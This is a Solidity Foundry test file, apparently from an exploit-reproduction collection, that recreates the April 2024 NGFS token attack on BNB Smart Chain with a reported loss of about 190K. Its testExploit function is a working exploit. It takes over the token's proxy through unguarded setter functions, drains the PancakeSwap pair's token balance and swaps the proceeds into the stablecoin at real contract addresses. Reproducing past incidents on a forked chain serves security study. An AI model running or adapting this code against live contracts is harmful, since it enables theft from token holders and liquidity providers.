// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";

// @KeyInfo - Total Lost : ~190K
// Attacker : https://bscscan.com/address/0xd03d360dfc1dac7935e114d564a088077e6754a0
// Attack Contract : https://bscscan.com/address/0xc73781107d086754314f7720ca14ab8c5ad035e4
// Vulnerable Contract : https://bscscan.com/address/0xa608985f5b40cdf6862bec775207f84280a91e3a
// Attack Tx : https://bscscan.com/tx/0x8ff764dde572928c353716358e271638fa05af54be69f043df72ad9ad054de25

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0xa608985f5b40cdf6862bec775207f84280a91e3a#code

// @Analysis
// Post-mortem : https://louistsai.vercel.app/p/2024-04-25-ngfs-exploit/
// Twitter Guy : https://twitter.com/CertiKAlert/status/1783476515331616847
// Hacking God : 

interface IPancakeFactory {
    function getPair(address, address) external returns(address);
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface INGFSToken {
    function delegateCallReserves() external;
    function setProxySync(address) external;
    function balanceOf(address) external view returns (uint256);
    function reserveMultiSync(address, uint256) external;
    function approve(address, uint256) external returns (bool);

}

interface IBEP20 {
    function balanceOf(address) external view returns (uint256);
}

contract NGFS is Test {
    uint256 blocknumToForkFrom = 38_167_372;
    address constant PancakeFactory = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;
    address constant PancakeRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address constant NGFSToken = 0xa608985f5b40CDf6862bEC775207f84280a91E3A;
    address constant BSCToken = 0x55d398326f99059fF775485246999027B3197955;

    function setUp() public {
        vm.createSelectFork("bsc", blocknumToForkFrom);
    }

    function testExploit() public {
        // Implement exploit code here
        uint256 tokenBalanceBefore = IBEP20(BSCToken).balanceOf(address(this));
        console.log("BSC Token Balance Before Attack %s", tokenBalanceBefore);
        address pair = IPancakeFactory(PancakeFactory).getPair(NGFSToken, BSCToken);
        INGFSToken(NGFSToken).delegateCallReserves();
        INGFSToken(NGFSToken).setProxySync(address(this));
        uint256 balance = INGFSToken(NGFSToken).balanceOf(pair);
        INGFSToken(NGFSToken).reserveMultiSync(address(this), balance);
        INGFSToken(NGFSToken).approve(PancakeRouter, type(uint256).max);
        uint256 amount = INGFSToken(NGFSToken).balanceOf(address(this));
        address[] memory path = new address[](2);
        path[0] = NGFSToken;
        path[1] = BSCToken;
        uint256 deadline = 1_714_043_885;
        IPancakeRouter(PancakeRouter).swapExactTokensForTokensSupportingFeeOnTransferTokens(amount, 0, path, address(this), deadline);

        // Log balances after exploit
        uint256 tokenBalanceAfter = IBEP20(BSCToken).balanceOf(address(this));
        console.log("BSC Token Balance Before Attack %s", tokenBalanceAfter);
        console.log("Attack Earned %s BSC Token", tokenBalanceAfter - tokenBalanceBefore);
    }
}
